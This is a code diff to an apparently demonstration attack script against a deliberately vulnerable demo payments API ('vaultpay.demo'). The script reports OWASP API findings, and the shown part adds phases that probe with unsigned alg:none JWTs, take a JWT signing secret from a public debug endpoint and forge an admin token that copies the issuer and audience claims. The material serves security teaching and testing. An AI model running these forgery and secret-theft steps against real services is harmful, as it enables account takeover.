     const noneToken = `${b64url(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64url(
@@ -931,53 +1154,98 @@ async function phaseForgery() {
             "Verification did not pin an algorithm allowlist",
             { kind: "app-code", owasp: "API2" }
         );
-    } else if (noneRes.status === 401) {
-        ok(
-            `alg:none rejected (${noneRes.status}) — jsonwebtoken v9 pins HS256/384/512 for string secrets, not the app`
+    } else if (
+        noneRes.status === 403 &&
+        (noneRes.headers["x-vercel-mitigated"] || noneRes.headers["cf-mitigated"] || !noneRes.json)
+    ) {
+        // A host firewall answered, not the app (e.g. Vercel: `x-vercel-mitigated: deny`).
+        notePlatform(
+            `alg:none request denied at the edge (403${noneRes.headers["x-vercel-mitigated"] ? ", x-vercel-mitigated: " + noneRes.headers["x-vercel-mitigated"] : ""}) — the app never saw it`,
+            "This is the host's firewall, not JWT verification. The app's own answer to an unsigned token is untested on this host."
         );
-        info("You did not configure this. A library maintainer did.");
+    } else if (noneRes.status === 401 || noneRes.status === 403) {
+        if (isExpressTarget()) {
+            ok(`alg:none rejected (${noneRes.status}) — jsonwebtoken v9 pins HS256/384/512 for string secrets, not the app`);
+            info("You did not configure this. A library maintainer did.");
+        } else {
+            ok(`alg:none rejected (${noneRes.status}) — an unsigned token is not accepted`);
+        }
     } else {
         info(`Unsigned-token probe inconclusive (${noneRes.status}); signature rejection not confirmed`);
     }
 
-    if (stolen.jwtSecret) {
-        narrate(`Forging HS256 admin JWT with leaked secret "${stolen.jwtSecret}"…`);
-        const admin =
-            stolen.users.find((u) => u.role === "admin") || {
-                id: 3,
-                email: "admin@vaultpay.demo",
-            };
-        const forged = signHs256(
-            {
-                sub: admin.id,
-                email: admin.email,
-                role: "admin",
-                name: "Forged Admin",
-                iat: Math.floor(Date.now() / 1000),
-                exp: Math.floor(Date.now() / 1000) + 86400,
-            },
-            stolen.jwtSecret
-        );
-        loot("forged-jwt", forged);
-        const me = await http("GET", "/api/me", {
-            headers: { Authorization: `Bearer ${forged}` },
-            label: "forged-admin-me",
-        });
-        if (me.status === 200 && me.json?.user?.id === admin.id && me.json.user.role === "admin") {
-            stolen.forgedAdminToken = forged;
-            bad("Server accepted a fully attacker-forged admin JWT");
-            loot("forged-identity", JSON.stringify(me.json?.user));
+    if (!stolen.jwtSecret) {
+        narrate("No signing secret yet — is there a leftover debug endpoint?");
+        const dbg = await http("GET", "/api/debug/config", { label: "debug-leak" });
+        if (dbg.status === 200 && dbg.json?.jwtSecret) {
+            stolen.jwtSecret = dbg.json.jwtSecret;
+            bad("Debug config is public — and it prints the signing secret");
+            loot("JWT_SECRET", stolen.jwtSecret);
             record(
                 "CRITICAL",
-                "Forged JWTs accepted (weak/leaked secret)",
-                "A forged token returned the intended admin identity. Signature verification is expected to accept correctly signed tokens; disclosure/weakness of the key is the authentication compromise.",
-                { kind: "app-code", owasp: "API2" }
+                "Debug endpoint leaks JWT signing secret",
+                "App left /api/debug/config public — forge any identity next",
+                { kind: "app-code", owasp: "API8" }
             );
         } else {
-            info(`Forged admin identity not confirmed (${me.status}); generated token is not counted as accepted`);
+            info(`/api/debug/config → ${dbg.status}`);
         }
+    }
+
+    if (!stolen.jwtSecret) {
+        blocked("forge", "No signing secret recovered by any route — nothing to forge with");
+        return;
+    }
+
+    // A real attacker copies the issuer / audience claims from their own valid token.
+    const copied = {};
+    try {
+        const own = JSON.parse(Buffer.from(String(stolen.token).split(".")[1], "base64url").toString("utf8"));
+        for (const k of ["aud", "iss"]) if (own[k] !== undefined) copied[k] = own[k];
+    } catch {
+        /* no session token to copy from */
+    }
+    if (Object.keys(copied).length) {
+        narrate(`Copying ${Object.keys(copied).join(" + ")} from our own valid token so the forgery matches…`);
+    }
+
+    narrate(`Forging HS256 admin JWT with leaked secret "${stolen.jwtSecret}"…`);
+    const admin =
+        stolen.users.find((u) => u.role === "admin") || {
+            id: 3,
+            email: "admin@vaultpay.demo",
+        };
+    const forged = signHs256(
+        {
+            sub: admin.id,
+            email: admin.email,
+            role: "admin",
+            name: "Forged Admin",
+            ...copied,
+            iat: Math.floor(Date.now() / 1000),
+            exp: Math.floor(Date.now() / 1000) + 86400,
+        },
+        stolen.jwtSecret
+    );
+    loot("forged-jwt", forged);
+    const me = await http("GET", "/api/me", {
+        headers: { Authorization: `Bearer ${forged}` },
+        label: "forged-admin-me",
+    });
+    if (me.status === 200 && me.json?.user?.id === admin.id && me.json.user.role === "admin") {
+        stolen.forgedAdminToken = forged;
+        bad("Server accepted a fully attacker-forged admin JWT");
+        loot("forged-identity", JSON.stringify(me.json?.user));
+        record(
+            "CRITICAL",
+            "Forged JWTs accepted (weak/leaked secret)",
+            "A forged token returned the intended admin identity. Signature verification is expected to accept correctly signed tokens; disclosure/weakness of the key is the authentication compromise.",
+            { kind: "app-code", owasp: "API2", probe: "forge" }
+        );
+    } else if (me.status === 401 || me.status === 403) {
+        blocked("forge", `Forged admin token rejected (${me.status}${refusalReason(me)})`);
     } else {
-        info("No JWT secret recovered — skip forgery");
+        info(`Forged admin identity not confirmed (${me.status}); generated token is not counted as accepted`);
     }
 }
 
@@ -996,8 +1264,10 @@ ${c.bold}${c.green}╔═══════════════════�
     · SSRF: allowlist egress hosts; reject link-local/metadata (169.254.169.254)
     · Authn ≠ authz: a valid JWT is not an access-control policy\n`);
 
-    console.log(`  ${c.blue}${c.bold}(framework-gap)${c.reset} — Express does not ship these; you must add them
+    if (stolen.findings.some((f) => f.kind === "framework-gap")) {
+        console.log(`  ${c.blue}${c.bold}(framework-gap)${c.reset} — this stack does not ship these; you must add them
     · Rate limit / login throttle (e.g. express-rate-limit)\n`);
+    }
 }
 
 function printReport() {
@@ -1022,6 +1292,7 @@ ${c.bold}${c.red}╔════════════════════
 `);
     const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
     console.log(`  ${c.bold}Target${c.reset}          ${BASE}`);
+    if (targetLabel) console.log(`  ${c.bold}Stack${c.reset}           ${targetLabel}`);
     console.log(`  ${c.bold}HTTP requests${c.reset}   ${reqSeq}`);
     console.log(`  ${c.bold}Elapsed${c.reset}         ${elapsedSec}s`);
     console.log(`  ${c.bold}Finding records${c.reset} ${stolen.findings.length}`);
@@ -1046,6 +1317,15 @@ ${c.bold}${c.red}╔════════════════════
         if (f.detail && !projector) info(f.detail);
     }
 
+    if (stolen.reduced.length) {
+        console.log(`\n  ${c.bold}${c.yellow}Reduced (hole still open, less to steal):${c.reset}`);
+        for (const m of stolen.reduced) console.log(`    ${c.yellow}◐${c.reset} ${m}`);
+    }
+    if (stolen.blocked.length) {
+        console.log(`\n  ${c.bold}${c.green}Blocked (the server refused the probe):${c.reset}`);
+        for (const m of stolen.blocked) console.log(`    ${c.green}✓${c.reset} ${m}`);
+    }
+
     if (stolen.platformNotes.length) {
         console.log(`\n  ${c.bold}${c.yellow}Platform notes (edge blocked probe — app may still be open):${c.reset}`);
         for (const n of stolen.platformNotes) {
@@ -1054,13 +1334,17 @@ ${c.bold}${c.red}╔════════════════════
         }
     }
 
+    const defended =
+        stolen.blocked.length + stolen.reduced.length
+            ? ` · ${stolen.blocked.length} blocked · ${stolen.reduced.length} reduced`
+            : "";
     if (criticals > 0) {
         console.log(
-            `\n${c.bgRed}${c.white}${c.bold}  DEMO RESULT: API PWNED — ${criticals} critical findings · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
+            `\n${c.bgRed}${c.white}${c.bold}  DEMO RESULT: API PWNED — ${criticals} critical findings${defended} · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
         );
     } else {
         console.log(
-            `\n${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: 0 critical · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
+            `\n${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: 0 critical${defended} · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
         );
     }
 
@@ -1071,12 +1355,20 @@ ${c.bold}${c.red}╔════════════════════
             JSON.stringify(
                 {
                     target: BASE,
+                    stack: targetLabel || null,
                     owaspEdition: 2023,
                     severityScheme: "demo-author-rated",
                     requests: reqSeq,
                     elapsedSeconds: Number(elapsedSec),
                     findings: stolen.findings,
                     platformNotes: stolen.platformNotes,
+                    reduced: stolen.reduced,
+                    blocked: stolen.blocked,
+                    probes: PROBES.map(([id, title]) => ({
+                        id,
+                        title,
+                        ...(stolen.outcomes[id] || { state: "not-reached", note: "" }),
+                    })),
                     usersStolen: stolen.users.length,
                     ordersStolen: stolen.orders.length,
                     jwtSecret: Boolean(stolen.jwtSecret),
@@ -1095,6 +1387,7 @@ ${c.bold}${c.red}╔════════════════════
  * so the forged-admin result stays on screen until you release it.
  */
 async function main() {
+    await identifyTarget();
     banner();
     await phaseReset();
     await dramaPause();
@@ -1104,9 +1397,9 @@ async function main() {
     await dramaPause();
     await phaseSsrfProxy();
     await dramaPause();
-    await phaseNoRateLimitFlood();
-    await dramaPause();
     await phaseAuthz();
+    await dramaPause();
+    await phaseNoRateLimitFlood();
     await dramaPause();
     await phaseForgery();
     await dramaPause();
